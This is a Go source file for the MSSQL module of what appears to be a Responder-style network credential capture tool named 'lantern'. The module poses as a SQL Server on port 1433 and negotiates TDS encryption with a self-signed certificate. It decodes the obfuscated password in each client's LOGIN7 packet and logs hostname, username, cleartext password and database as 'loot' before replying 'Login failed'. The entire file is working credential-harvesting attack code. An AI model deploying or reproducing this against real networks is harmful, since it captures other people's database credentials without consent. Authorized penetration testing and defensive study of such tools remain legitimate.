package mssql

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
	"unicode/utf16"

	"lantern/internal/core"
)

const (
	ServiceName      = "mssql"
	DefaultPort      = 1433
	packetHeaderSize = 8
	maxMessageSize   = 128 * 1024
	readTimeout      = 5 * time.Second
	tdsPrelogin      = 0x12
	tdsLogin7        = 0x10
	tdsResponse      = 0x04
	tdsEndOfMessage  = 0x01
)

type Module struct {
	Address string
	Port    int
	Logger  *core.Logger
	// TLSConfig can supply a trusted server certificate. If nil, the listener
	// creates an ephemeral self-signed certificate for TDS encryption.
	TLSConfig *tls.Config
	// TLSForOptionalEncryption enables login-only TLS when a client requests
	// ENCRYPT_OFF. By default, optional encryption uses clear TDS for legacy clients.
	TLSForOptionalEncryption bool

	mu        sync.Mutex
	listener  net.Listener
	cancel    context.CancelFunc
	wg        sync.WaitGroup
	tlsOnce   sync.Once
	tlsConfig *tls.Config
	tlsErr    error
}

func New(logger *core.Logger) *Module {
	return &Module{Address: "0.0.0.0", Port: DefaultPort, Logger: logger}
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return true }
func (m *Module) HasPoisoner() bool { return false }

func (m *Module) StartPoisoner(context.Context, core.Config) error {
	return errors.New("MSSQL poisoning is not supported")
}

func (m *Module) StartListener(ctx context.Context, cfg core.Config) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.listener != nil {
		return errors.New("MSSQL listener is already running")
	}
	if _, err := m.serverTLSConfig(); err != nil {
		return fmt.Errorf("prepare TDS TLS certificate: %w", err)
	}

	bindAddress := m.Address
	if cfg.InterfaceAddress != "" {
		bindAddress = cfg.InterfaceAddress
	}
	address := net.JoinHostPort(bindAddress, strconv.Itoa(m.Port))
	listener, err := net.Listen("tcp", address)
	if err != nil {
		return fmt.Errorf("bind TCP %s: %w", address, err)
	}

	runCtx, cancel := context.WithCancel(ctx)
	m.listener = listener
	m.cancel = cancel
	m.log(core.Success, "Listening on %s", listener.Addr())
	m.wg.Add(1)
	go m.serve(runCtx, listener)
	return nil
}

func (m *Module) serve(ctx context.Context, listener net.Listener) {
	defer m.wg.Done()
	defer func() {
		_ = listener.Close()
		m.mu.Lock()
		if m.listener == listener {
			m.listener = nil
			m.cancel = nil
		}
		m.mu.Unlock()
	}()

	go func() {
		<-ctx.Done()
		_ = listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			m.log(core.Error, "Accept failed: %v", err)
			return
		}
		m.log(core.Info, "Incoming TCP connection from %s", conn.RemoteAddr())
		m.wg.Add(1)
		go func() {
			defer m.wg.Done()
			m.handleConnection(ctx, conn)
		}()
	}
}

func (m *Module) handleConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()
	client := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(client); err == nil {
		client = host
	}

	messageConn := net.Conn(conn)
	responseConn := net.Conn(conn)
	for {
		deadline := time.Now().Add(readTimeout)
		if ctxDeadline, ok := ctx.Deadline(); ok && ctxDeadline.Before(deadline) {
			deadline = ctxDeadline
		}
		_ = conn.SetDeadline(deadline)

		packetType, payload, err := readMessage(messageConn)
		if err != nil {
			if ctx.Err() == nil && !errors.Is(err, io.EOF) {
				m.packet("TDS", "Read from %s failed: %v", client, err)
			}
			return
		}

		switch packetType {
		case tdsPrelogin:
			options, err := parsePrelogin(payload)
			if err != nil {
				m.packet("TDS", "Invalid PRELOGIN from %s: %v", client, err)
				return
			}
			encryption, enableTLS, encryptResponse, err := negotiateEncryption(options, m.TLSForOptionalEncryption)
			if err != nil {
				m.packet("TDS", "Unsupported encryption request from %s: %v", client, err)
				return
			}
			if err := writePacket(conn, tdsResponse, buildPreloginResponse(encryption)); err != nil {
				m.packet("TDS", "Failed to send PRELOGIN response to %s: %v", client, err)
				return
			}
			if enableTLS {
				config, err := m.serverTLSConfig()
				if err != nil {
					m.packet("TDS", "TLS setup failed for %s: %v", client, err)
					return
				}
				tlsTransport := &tdsTLSConn{Conn: conn, framed: true}
				tlsConn := tls.Server(tlsTransport, config)
				if err := tlsConn.HandshakeContext(ctx); err != nil {
					m.packet("TDS", "TLS handshake with %s failed: %v", client, err)
					return
				}
				tlsTransport.switchToRawTLS()
				messageConn = tlsConn
				if encryptResponse {
					responseConn = tlsConn
				}
			}
			m.packet("TDS", "PRELOGIN completed with %s (encryption %d)", client, encryption)
		case tdsLogin7:
			identity, err := parseLogin7(payload)
			if err != nil {
				m.packet("TDS", "Invalid LOGIN7 from %s: %v", client, err)
				return
			}
			m.logLogin(client, identity)
			if err := writePacket(responseConn, tdsResponse, buildLoginFailedResponse(identity.tdsVersion)); err != nil {
				m.packet("TDS", "Failed to send login response to %s: %v", client, err)
			}
			return
		default:
			m.packet("TDS", "Unsupported packet type 0x%02x from %s", packetType, client)
			return
		}
	}
}

type preloginOptions map[byte][]byte

func parsePrelogin(data []byte) (preloginOptions, error) {
	options := make(preloginOptions)
	if len(data) < 6 {
		return nil, errors.New("PRELOGIN option table is too short")
	}
	terminator := -1
	for offset := 0; offset < len(data); {
		if data[offset] == 0xff {
			terminator = offset
			break
		}
		if offset+5 > len(data) {
			return nil, errors.New("truncated PRELOGIN option")
		}
		token := data[offset]
		start := int(binary.BigEndian.Uint16(data[offset+1 : offset+3]))
		length := int(binary.BigEndian.Uint16(data[offset+3 : offset+5]))
		if start < 0 || length < 0 || start+length > len(data) {
			return nil, fmt.Errorf("PRELOGIN option 0x%02x points outside the message", token)
		}
		options[token] = data[start : start+length]
		offset += 5
	}
	if terminator < 0 {
		return nil, errors.New("PRELOGIN terminator missing")
	}
	if terminator == 0 || data[0] != 0x00 {
		return nil, errors.New("VERSION must be the first PRELOGIN option")
	}
	return options, nil
}

func negotiateEncryption(options preloginOptions, tlsForOptional bool) (response byte, enableTLS, encryptResponse bool, err error) {
	clientOption, ok := options[0x01]
	if !ok || len(clientOption) != 1 {
		return 0, false, false, errors.New("ENCRYPTION option is missing or malformed")
	}
	clientValue := clientOption[0]
	if clientValue&0x80 != 0 {
		return 0, false, false, errors.New("client-certificate authentication is not supported")
	}
	switch clientValue {
	case 0x00: // ENCRYPT_OFF: either clear TDS or TLS-protected LOGIN7.
		if tlsForOptional {
			return 0x00, true, false, nil
		}
		return 0x02, false, false, nil
	case 0x01: // ENCRYPT_ON: require full-connection TLS.
		return 0x01, true, true, nil
	case 0x02: // ENCRYPT_NOT_SUP: use a clear TDS connection.
		return 0x02, false, false, nil
	case 0x03: // ENCRYPT_REQ: negotiate full-connection TLS.
		return 0x01, true, true, nil
	default:
		return 0, false, false, fmt.Errorf("unknown ENCRYPTION value 0x%02x", clientValue)
	}
}

func buildPreloginResponse(encryption byte) []byte {
	// VERSION, ENCRYPTION, INSTOPT and THREADID followed by the terminator.
	const tableSize = 4*5 + 1
	data := make([]byte, tableSize+6+1+1+4)
	offset := tableSize
	writeOption := func(index int, token byte, length int) {
		entry := index * 5
		data[entry] = token
		binary.BigEndian.PutUint16(data[entry+1:entry+3], uint16(offset))
		binary.BigEndian.PutUint16(data[entry+3:entry+5], uint16(length))
		offset += length
	}
	writeOption(0, 0x00, 6) // VERSION
	writeOption(1, 0x01, 1) // ENCRYPTION
	writeOption(2, 0x02, 1) // INSTOPT
	writeOption(3, 0x03, 4) // THREADID
	data[20] = 0xff
	copy(data[tableSize:tableSize+6], []byte{0x0f, 0x00, 0x00, 0x00, 0x00, 0x00})
	data[tableSize+6] = encryption
	data[tableSize+7] = 0x00 // Default instance.
	// Thread ID is zero initialized.
	return data
}

type loginIdentity struct {
	hostname   string
	username   string
	password   string
	app        string
	database   string
	integrated bool
	tdsVersion uint32
}

func parseLogin7(data []byte) (loginIdentity, error) {
	var identity loginIdentity
	if len(data) < 86 {
		return identity, errors.New("LOGIN7 fixed header is truncated")
	}
	declaredLength := int(binary.LittleEndian.Uint32(data[:4]))
	tdsVersion := binary.BigEndian.Uint32(data[4:8])
	fixedHeaderLength := 86
	if tdsVersion>>24 >= 0x72 {
		fixedHeaderLength = 94
	}
	if declaredLength < fixedHeaderLength || declaredLength > len(data) {
		return identity, fmt.Errorf("invalid LOGIN7 length %d", declaredLength)
	}
	data = data[:declaredLength]
	identity.tdsVersion = tdsVersion
	identity.integrated = data[25]&0x80 != 0
	readString := func(offsetField, lengthField int) (string, error) {
		offset := int(binary.LittleEndian.Uint16(data[offsetField : offsetField+2]))
		units := int(binary.LittleEndian.Uint16(data[lengthField : lengthField+2]))
		length := units * 2
		if units == 0 {
			return "", nil
		}
		if offset < fixedHeaderLength || offset+length > len(data) {
			return "", fmt.Errorf("LOGIN7 string at offset %d with length %d is out of bounds", offset, length)
		}
		return decodeUTF16LE(data[offset : offset+length]), nil
	}
	var err error
	if identity.hostname, err = readString(36, 38); err != nil {
		return identity, err
	}
	if identity.username, err = readString(40, 42); err != nil {
		return identity, err
	}
	if identity.password, err = readLoginPassword(data, fixedHeaderLength); err != nil {
		return identity, err
	}
	if identity.app, err = readString(48, 50); err != nil {
		return identity, err
	}
	if identity.database, err = readString(68, 70); err != nil {
		return identity, err
	}
	return identity, nil
}

func readLoginPassword(data []byte, fixedHeaderLength int) (string, error) {
	offset := int(binary.LittleEndian.Uint16(data[44:46]))
	units := int(binary.LittleEndian.Uint16(data[46:48]))
	length := units * 2
	if units == 0 {
		return "", nil
	}
	if offset < fixedHeaderLength || offset+length > len(data) {
		return "", fmt.Errorf("LOGIN7 password at offset %d with length %d is out of bounds", offset, length)
	}
	decoded := make([]byte, length)
	for i, value := range data[offset : offset+length] {
		value ^= 0xa5
		decoded[i] = value<<4 | value>>4
	}
	return decodeUTF16LE(decoded), nil
}

func decodeUTF16LE(data []byte) string {
	units := make([]uint16, len(data)/2)
	for i := range units {
		units[i] = binary.LittleEndian.Uint16(data[i*2 : i*2+2])
	}
	return string(utf16.Decode(units))
}

func (m *Module) logLogin(client string, identity loginIdentity) {
	if m.Logger == nil {
		return
	}
	if identity.hostname == "" {
		identity.hostname = "<not provided>"
	}
	if identity.username == "" && identity.integrated {
		identity.username = "<integrated authentication>"
	}
	if identity.username == "" {
		identity.username = "<not provided>"
	}
	if identity.password == "" {
		identity.password = "<not provided>"
	}
	if identity.app == "" {
		identity.app = "<not provided>"
	}
	if identity.database == "" {
		identity.database = "<default>"
	}
	mode := "SQL authentication"
	if identity.integrated {
		mode = "Integrated authentication"
	}
	m.Logger.Loot(
		fmt.Sprintf("[MSSQL] %s login from %s", mode, client),
		"[MSSQL] Hostname : %s\n[MSSQL] Username : %s\n[MSSQL] Password : %q\n[MSSQL] Database : %s\n[MSSQL] Application : %s",
		identity.hostname, identity.username, identity.password, identity.database, identity.app)
}

func buildLoginFailedResponse(tdsVersion uint32) []byte {
	message := encodeUTF16LE("Login failed for user.")
	server := encodeUTF16LE("LANTERN")
	lineNumberLength, doneRowCountLength := 2, 4
	if tdsVersion>>24 >= 0x72 {
		lineNumberLength, doneRowCountLength = 4, 8
	}
	// ERROR token (0xAA) with SQL Server error 18456 and LOGINACK-free DONE.
	errorToken := make([]byte, 3+4+1+1+2+len(message)+1+len(server)+1+lineNumberLength)
	position := 0
	errorToken[position] = 0xaa
	position += 3 // token and length are filled below.
	binary.LittleEndian.PutUint32(errorToken[position:position+4], 18456)
	position += 4
	errorToken[position] = 1    // state
	errorToken[position+1] = 14 // class
	position += 2
	binary.LittleEndian.PutUint16(errorToken[position:position+2], uint16(len(message)/2))
	position += 2
	copy(errorToken[position:], message)
	position += len(message)
	errorToken[position] = byte(len(server) / 2)
	position++
	copy(errorToken[position:], server)
	position += len(server)
	errorToken[position] = 0 // procedure name length
	position++
	if lineNumberLength == 2 {
		binary.LittleEndian.PutUint16(errorToken[position:position+2], 1)
	} else {
		binary.LittleEndian.PutUint32(errorToken[position:position+4], 1)
	}
	position += lineNumberLength
	binary.LittleEndian.PutUint16(errorToken[1:3], uint16(position-3))

	response := append(errorToken, 0xfd, 0x02, 0x00, 0x00, 0x00)
	response = append(response, make([]byte, doneRowCountLength)...)
	return response
}

func readMessage(conn net.Conn) (byte, []byte, error) {
	var packetType byte
	message := make([]byte, 0, 4096)
	for {
		header := make([]byte, packetHeaderSize)
		if _, err := io.ReadFull(conn, header); err != nil {
			return 0, nil, err
		}
		length := int(binary.BigEndian.Uint16(header[2:4]))
		if length < packetHeaderSize {
			return 0, nil, fmt.Errorf("invalid TDS packet length %d", length)
		}
		if len(message)+length-packetHeaderSize > maxMessageSize {
			return 0, nil, errors.New("TDS message exceeds size limit")
		}
		if len(message) == 0 {
			packetType = header[0]
		} else if packetType != header[0] {
			return 0, nil, errors.New("TDS packet type changed within message")
		}
		fragment := make([]byte, length-packetHeaderSize)
		if _, err := io.ReadFull(conn, fragment); err != nil {
			return 0, nil, err
		}
		message = append(message, fragment...)
		if header[1]&tdsEndOfMessage != 0 {
			return packetType, message, nil
		}
	}
}

func writePacket(conn net.Conn, packetType byte, payload []byte) error {
	if len(payload)+packetHeaderSize > 0xffff {
		return errors.New("TDS response exceeds packet size")
	}
	packet := make([]byte, packetHeaderSize+len(payload))
	packet[0] = packetType
	packet[1] = tdsEndOfMessage
	binary.BigEndian.PutUint16(packet[2:4], uint16(len(packet)))
	packet[6] = 1
	copy(packet[packetHeaderSize:], payload)
	for len(packet) > 0 {
		written, err := conn.Write(packet)
		if err != nil {
			return err
		}
		if written == 0 {
			return io.ErrShortWrite
		}
		packet = packet[written:]
	}
	return nil
}

func encodeUTF16LE(value string) []byte {
	units := utf16.Encode([]rune(value))
	encoded := make([]byte, len(units)*2)
	for i, unit := range units {
		binary.LittleEndian.PutUint16(encoded[i*2:i*2+2], unit)
	}
	return encoded
}

func (m *Module) log(level core.Level, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Print(level, "MSSQL", format, args...)
	}
}

func (m *Module) packet(packetType, format string, args ...any) {
	if m.Logger != nil {
		m.Logger.Packet(ServiceName, packetType, format, args...)
	}
}

// Stop closes the listener and waits for all connection handlers to return.
func (m *Module) Stop() {
	m.mu.Lock()
	cancel, listener := m.cancel, m.listener
	m.mu.Unlock()
	if cancel != nil {
		cancel()
	}
	if listener != nil {
		_ = listener.Close()
	}
	m.wg.Wait()
	m.log(core.Info, "Listener stopped")
}
